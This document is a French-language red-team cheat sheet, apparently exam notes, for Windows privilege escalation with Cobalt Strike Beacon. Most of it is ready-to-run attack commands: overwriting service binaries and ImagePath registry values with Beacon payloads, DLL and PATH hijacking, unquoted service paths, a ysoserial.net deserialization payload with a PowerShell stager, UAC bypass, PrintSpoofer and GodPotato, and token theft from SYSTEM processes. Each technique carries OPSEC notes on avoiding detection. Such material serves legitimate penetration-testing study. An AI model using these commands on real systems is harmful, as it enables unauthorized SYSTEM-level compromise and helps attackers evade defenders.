# Privilege Escalation — Élévation de privilèges  

>Après la Persistence initiale et la Post-Exploitation, la phase de **Privilege Escalation** commence.  

* Path Interception
* Weak Service Permissions
* DLL Search Order Hijacking
* Software Vulnerabilities
* User Account Control UAC  

---

## Contexte du compte — Identifier ses privilèges

| Compte | Integrity Level | Remarques |
|---------|----------------|-------|
| Standard User | Medium | Accès limité à ses propres fichiers |
| Local Admin (sans élévation UAC) | Medium | Appartenir au groupe Admin ne signifie pas high integrity |
| Local Admin (élevé) | High | Processus autorisé par UAC |
| LocalService / NetworkService | Low–Medium | Gérés par SCM ; authentification réseau différente |
| SYSTEM / LocalSystem | System | Niveau supérieur aux droits admin locaux dans certains cas |

```cs
// Check current integrity level and token
beacon> getuid
beacon> whoami /groups     // via shell — look for "High Mandatory Level"
```

**Point essentiel :** l'appartenance au groupe Administrators ne suffit pas sans token high integrity. UAC contrôle cette élévation.

---

## Services vulnérables — Surface d'attaque

| Mauvaise configuration | Technique | MITRE |
|-----------------|-----------|-------|
| Binaire de service modifiable | Service File Permissions | T1574.010 |
| Clé Registry du service modifiable | Service Registry Permissions | T1574.011 |
| DLL manquante, dossier exécutable modifiable | DLL Search Order Hijacking | T1574.001 |
| Dossier modifiable dans PATH SYSTEM | PATH Environment Variable | T1574.007 |
| Référence relative au binaire, dossier modifiable | Search Order Hijacking | T1574.008 |
| Chemin de binaire avec espaces sans guillemets | Unquoted Service Path | T1574.009 |
| Logiciel privilégié vulnérable | Software Exploitation | T1068 |

---

## Énumération — Identifier les vecteurs de Privilege Escalation

### OPSEC: CAUTION (fork & run)
```cs
// Automated — SharpUp finds common service misconfigs
beacon> execute-assembly C:\Tools\SharpUp\SharpUp.exe audit

// PowerView / PowerSploit — manual checks
beacon> powerpick Get-WmiObject -Class Win32_Service | select Name,PathName,StartMode,StartName

// Native — check service config
beacon> shell sc qc <ServiceName>
beacon> shell wmic service get name,pathname,startmode,startname

// Check permissions on a path or binary
beacon> shell cacls "C:\Path\To\Service.exe"
beacon> shell icacls "C:\Path\To\Service.exe"

// Check PATH environment variable
beacon> shell env
```

---

## Weak Service File Permissions — Permissions des fichiers service

**Condition :** les ACL du binaire du service accordent l'écriture à un utilisateur standard.  
**Exploitation :** remplacer le binaire par un payload, puis redémarrer le service pour l'exécuter sous SYSTEM.

```cs
// 1. Verify writable ACL on binary
beacon> shell cacls "C:\Program Files\VulnService\service.exe"
// Look for: BUILTIN\Users:(W) or Authenticated Users:(W)

// 2. Upload svc payload (must use svc.exe artifact for services)
beacon> upload C:\Payloads\beacon-svc.exe
beacon> shell copy beacon-svc.exe "C:\Program Files\VulnService\service.exe"

// 3. Restart service
beacon> shell sc stop VulnService
beacon> shell sc start VulnService
```

**Attention :** le binaire ne peut pas être remplacé tant que le service s'exécute. L'arrêter au préalable.  
**Modification destructive :** le binaire d'origine est écrasé. Documenter et restaurer si nécessaire.

---

## Weak Service Registry Permissions — Permissions Registry

**Condition :** les ACL de la clé Registry du service accordent l'écriture à un utilisateur standard.  
**Exploitation :** modifier `ImagePath` pour pointer vers le payload, puis redémarrer le service.

```cs
// Check registry key permissions
beacon> shell reg query HKLM\SYSTEM\CurrentControlSet\Services\VulnService

// Modify ImagePath to your payload
beacon> shell reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnService /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\beacon-svc.exe" /f

// Restart service
beacon> shell sc stop VulnService
beacon> shell sc start VulnService
```

### Performance Key Abuse — Technique de Clément Labro
**Condition :** la clé Registry du service est accessible en écriture, sans modifier `ImagePath`.  
**Exploitation :** ajouter une sous-clé `Performance` pointant vers une DLL, sans interrompre le fonctionnement normal du service.

---

## DLL Search Order Hijacking

**Ordre de recherche des DLL (applications standards) :**
1. Dossier de l'exécutable (emplacement du binaire)
2. System32
3. Dossier System 16-bit
4. Dossier Windows
5. Working directory courant
6. Dossiers présents dans la variable d'environnement PATH

**Condition :** le binaire du service charge une DLL par son nom relatif et un dossier prioritaire de la search order est modifiable.

```cs
// 1. Check permissions on service executing directory
beacon> shell cacls "C:\Program Files\VulnService\"
// Look for: Authenticated Users or Users with (W)/(F)

// 2. Upload malicious DLL named to match the missing/hijackable DLL
beacon> upload C:\Payloads\BadDll.dll
beacon> shell copy BadDll.dll "C:\Program Files\VulnService\BadDll.dll"

// 3. Restart service to trigger DLL load
beacon> shell sc stop VulnService
beacon> shell sc start VulnService
```

**Attention :** utiliser un payload DLL adapté, exportant les fonctions attendues par le service (ou une DLL sans export si aucune vérification n'est réalisée).

---

## Path Interception — Variable d'environnement PATH

**Condition :** un dossier accessible en écriture aux utilisateurs standards précède System32 dans le PATH système, parfois à cause d'un installer.

```cs
// 1. Enumerate PATH
beacon> shell env
// Look for user-writable dirs that appear BEFORE C:\Windows\System32

// 2. Check write permissions on suspicious PATH dir
beacon> shell cacls "C:\Scripts"
// Look for: Authenticated Users (W) or (F)

// 3. Drop payload named after a binary the service calls (e.g. timeout.exe)
beacon> upload C:\Payloads\beacon-svc.exe
beacon> shell copy beacon-svc.exe "C:\Scripts\timeout.exe"

// 4. Wait for service/scheduled task to call the binary, OR restart
```

**Attention :** utiliser le nom `timeout.exe` plutôt que `cmd.exe`, ce dernier bénéficiant d'un traitement particulier par l'API CreateProcess.

---

## Path Interception — Unquoted Service Path

**Condition :** le chemin du binaire de service contient des espaces sans être entouré de guillemets.  
**Exploitation :** CreateProcess peut interpréter les espaces comme des séparateurs et tester plusieurs chemins.

```
Path: C:\Bad Program Files\Bad Service\service.exe
Interpreted as:
  1. C:\Bad.exe
  2. C:\Bad Program.exe
  3. C:\Bad Program Files\Bad.exe
  4. C:\Bad Program Files\Bad Service\service.exe  ← legitimate
```

```cs
// 1. Find unquoted service paths
beacon> shell wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
// OR use SharpUp
beacon> execute-assembly C:\Tools\SharpUp\SharpUp.exe audit

// 2. Identify writable location in the interpreted path chain
beacon> shell cacls "C:\Bad Program Files\"

// 3. Upload svc payload to the exploitable interpreted location
beacon> upload C:\Payloads\beacon-svc.exe
beacon> shell copy beacon-svc.exe "C:\Bad Program Files\Bad.exe"

// 4. Restart service
beacon> shell sc stop VulnService
beacon> shell sc start VulnService
// If can't restart — wait for reboot
```

**Utiliser un payload au format `svc.exe` pour l'exécution en tant que service.**

---

## Software Vulnerabilities — Exemple de désérialisation

**Condition :** une application privilégiée désérialise des données contrôlées par l'attaquant.

```bash
# Kali — generate malicious blob with ysoserial.net
# TypeConfuseDelegate gadget + BinaryFormatter + PowerShell stager
mono ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o raw \
  -c "powershell -enc <base64_payload>" > data.bin
```

```cs
// Upload blob to the location the vulnerable app reads from
beacon> upload data.bin
beacon> shell copy data.bin "C:\VulnApp\data.bin"
// Wait for app to deserialise → code executes as elevated user
```

---

## UAC Bypass

**Condition :** l'utilisateur est administrateur local, mais le Beacon est en medium integrity. Il faut un niveau high integrity pour les actions admin.

### elevate — Créer un nouveau Beacon high integrity
```cs
// List available UAC exploits
beacon> elevate

// Spawn elevated Beacon (high-integrity) via built-in bypass
beacon> elevate uac-token-duplication <listener>
beacon> elevate svc-exe <listener>
```

### runasadmin — Exécuter une commande en high integrity
```cs
// List available elevators
beacon> runasadmin

// Run command elevated (no new Beacon — command only)
beacon> runasadmin uac-token-duplication <command> <args>
```

**Après l'élévation :** vérifier avec `getuid` que le contexte est en high integrity.

---

## BOF et assemblies utiles pour Privilege Escalation

| Outil | Utilité | Commande |
|------|-----|---------|
| **SharpUp** | Audit automatisé des mauvaises configurations services/chemins | `execute-assembly SharpUp.exe audit` |
| **Seatbelt** | Reconnaissance locale : UAC, tokens et droits utilisateur | `execute-assembly Seatbelt.exe -group=system` |
| **PowerView** | Énumération des services via WMI | `powerpick Get-WmiObject Win32_Service` |
| **Watson** | Vérification des correctifs absents et CVE | `execute-assembly Watson.exe` |
| **ysoserial.net** | Générateur de gadgets de désérialisation .NET | Run on Kali — upload output |

---

## Exploitation de SeImpersonatePrivilege

**Condition :** Beacon sous NetworkService, LocalService ou un compte de service disposant de `SeImpersonatePrivilege`.  
**Exploitation :** techniques de la famille Potato (PrintSpoofer, GodPotato, etc.) permettant l'impersonation d'un token SYSTEM.

```cs
// Check current privileges
beacon> shell whoami /priv
// Look for: SeImpersonatePrivilege — Enabled

// PrintSpoofer via execute-assembly
beacon> execute-assembly C:\Tools\PrintSpoofer\PrintSpoofer.exe -i -c "C:\Payloads\beacon-svc.exe"

// GodPotato
beacon> execute-assembly C:\Tools\GodPotato\GodPotato.exe -cmd "C:\Payloads\beacon-svc.exe"
```

---

## getsystem — Fonction native Cobalt Strike

```
OPSEC: CAUTION — tries multiple techniques internally, some noisy
```
```cs
beacon> getsystem
// Attempts named pipe impersonation and token duplication techniques
// Confirm result:
beacon> getuid
```

**Pour le score OPSEC, ces notes privilégient les techniques explicites (PrintSpoofer, token stealing) à getsystem.**

---

## steal_token — Token Impersonation

```
OPSEC: SAFE — no new process
```
```cs
// Find a SYSTEM or high-priv process
beacon> process_browser     // GUI tab — find SYSTEM/high-priv process, right-click → steal token / inject
// Look for: lsass.exe, winlogon.exe, services.exe running as SYSTEM

// Steal the token
beacon> steal_token <pid>
beacon> getuid    // confirm impersonation
beacon> rev2self  // revert to original token
```

---

## Référence rapide — Arbre de décision Privilege Escalation

```
Low-priv beacon?
  │
  ├─ Already local admin?
  │    └─ Medium integrity → UAC bypass
  │         elevate uac-token-duplication <listener>
  │
  ├─ SeImpersonatePrivilege?
  │    └─ PrintSpoofer / GodPotato → SYSTEM
  │
  ├─ Service misconfig? (SharpUp / wmic enum)
  │    ├─ Writable binary     → overwrite with svc payload
  │    ├─ Writable registry   → change ImagePath
  │    ├─ Unquoted path       → drop svc payload at interpreted loc
  │    ├─ Missing DLL         → DLL hijack via writable dir
  │    └─ Writable PATH dir   → drop binary named after expected call
  │
  └─ Software vuln (elevated process)?
       └─ ysoserial / exploit → code exec as elevated user

After every escalation:
  beacon> getuid    ← confirm privilege level
  beacon> rev2self  ← revert token when done with high-priv action
```

---

## Récapitulatif OPSEC

| Technique | OPSEC | Remarques |
|-----------|-------|-------|
| `steal_token` | SAFE | Aucun nouveau processus |
| `execute-assembly SharpUp` | CAUTION | Fork & run |
| `elevate uac-token-duplication` | CAUTION | Crée un nouveau Beacon |
| `getsystem` | CAUTION | Plusieurs tentatives internes |
| `shell sc stop/start` | UNSAFE | Crée cmd.exe ; redémarrage de service enregistré (Event 7036) |
| Remplacement du binaire de service | UNSAFE | Destructif ; écrit sur disque |
| Dépôt DLL hijack | CAUTION | Écriture disque ; déclenché au redémarrage du service |
